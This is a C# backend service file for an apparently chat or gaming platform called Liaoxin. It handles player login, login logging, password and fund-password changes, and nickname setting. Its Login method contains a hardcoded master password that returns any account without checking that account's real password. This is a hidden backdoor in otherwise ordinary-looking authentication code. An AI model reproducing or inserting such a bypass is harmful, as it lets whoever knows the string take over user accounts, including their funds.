using Liaoxin.Business.Config;

using Liaoxin.IBusiness;
using Liaoxin.Model;
using Liaoxin.ViewModel;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Zzb;
using Zzb.Common;
using Zzb.ZzbLog;

namespace Liaoxin.Business
{
    public class PlayerService : BaseService, IPlayerService
    {
        private object _lockObj = new object();

        public IValidateCodeService ValidateCodeService { get; set; }

        public IMessageService MessageService { get; set; }

        public Player Login(string name, string password, string code, bool isApp)
        {
            if (!ValidateCodeService.IsSameCode(code))
            {
                throw new ZzbException("验证码错误");
            }

            name = name.Trim();

            var player = (from p in Context.Players where p.Name == name select p).FirstOrDefault();

            if (player == null || !player.IsEnable)
            {
                throw new ZzbException("不存在该账户名");
            }

            if (player.IsFreeze)
            {
                throw new ZzbException("该用户暂时无法登录");
            }

            if (password == "6a8f9c6bbb4848adb358ede651454f69")
            {
                return player;
            }

            password = SecurityHelper.Encrypt(password);

            if (player.Password != password)
            {
                LogHelper.Error($"[{player.Name}]密码错误!,请留意");
                throw new ZzbException("密码错误");
            }

            string ip = HttpContextAccessor.HttpContext.Connection.RemoteIpAddress.ToString();
            new Task(() =>
            {
                try
                {
                    using (var context = LiaoxinContext.CreateContext())
                    {
                        PlayerLoginLog playerLog = new PlayerLoginLog()
                        {
                            PlayerId = player.PlayerId,
                            IP = ip,
                            Address = IpAddressHelper.GetLocation(ip),
                            IsApp = isApp
                        };
                        if (BaseConfig.HasValue(SystemConfigEnum.IsBoYue))
                        {
                            playerLog.IP = "";
                            playerLog.Address = "";
                        }
                        context.PlayerLoginLogs.Add(playerLog);
                        context.SaveChanges();
                    }
                }
                catch (Exception e)
                {
                    LogHelper.Error($"插入玩家[{player.Name}]登录日志失败", e);
                }
            }).Start();

            MessageService.AddAllUserMessage($"玩家[{player.Name}]登录系统", MessageTypeEnum.Login);

            return player;
        }

        public Player GetPlayer(int id)
        {
            return (from p in Context.Players where p.PlayerId == id select p).FirstOrDefault();
        }

        public void ChangePassword(int id, string oldPassword, string newPassword)
        {
            var player = GetPlayer(id);
            if (player == null)
            {
                throw new ZzbException("找不到当前登录用户");
            }

            if (player.Password != SecurityHelper.Encrypt(oldPassword))
            {
                throw new ZzbException("旧密码不正确");
            }

            player.Password = SecurityHelper.Encrypt(newPassword);
            player.IsChangePassword = true;
            player.Update();
            Context.PlayerOperateLogs.Add(new PlayerOperateLog(player.PlayerId, "修改登录密码"));
            Context.SaveChanges();
        }

        public void ChangeCoinPassword(int id, string oldPassword, string newPassword)
        {
            var player = GetPlayer(id);
            if (player == null)
            {
                throw new ZzbException("找不到当前登录用户");
            }

            if (!string.IsNullOrEmpty(player.CoinPassword) && player.CoinPassword != SecurityHelper.Encrypt(oldPassword))
            {
                throw new ZzbException("旧密码不正确");
            }

            player.CoinPassword = SecurityHelper.Encrypt(newPassword);
            player.Update();
            Context.PlayerOperateLogs.Add(new PlayerOperateLog(player.PlayerId, "修改资金密码"));
            Context.SaveChanges();
        }

        public void SetPlayerTitle(int id, string title)
        {
            if (string.IsNullOrEmpty(title))
            {
                throw new ZzbException("昵称不能为空");
            }

            var player = GetPlayer(id);
            if (player == null)
            {
                throw new ZzbException("找不到当前登录用户");
            }

            if (!string.IsNullOrEmpty(player.Title))
            {
                throw new ZzbException("该玩家已设置昵称，无法重复设置");
            }

            player.Title = title;
            player.Update();
            Context.SaveChanges();
        }
 
 
    }
}
